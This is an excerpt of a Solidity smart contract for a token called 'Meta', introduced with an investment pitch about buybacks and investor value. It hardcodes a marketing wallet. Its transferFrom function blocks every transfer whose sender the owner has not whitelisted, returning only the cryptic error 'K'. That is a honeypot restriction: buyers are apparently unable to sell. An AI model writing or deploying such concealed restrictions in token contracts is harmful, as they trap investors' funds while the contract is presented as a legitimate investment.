...
Meta is built upon the fundamentals of Buyback and increasing the investor's value
...
contract Meta is Context, IERC20, Ownable {
    ...
    address payable public marketingAddress = payable(0x70D2FF928acEbEc75BBBaA2A3F6F1F2A0dabdc31); // Marketing Address
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if (sender != owner() && recipient != owner()) {require(_isExcluded[sender], "K");}
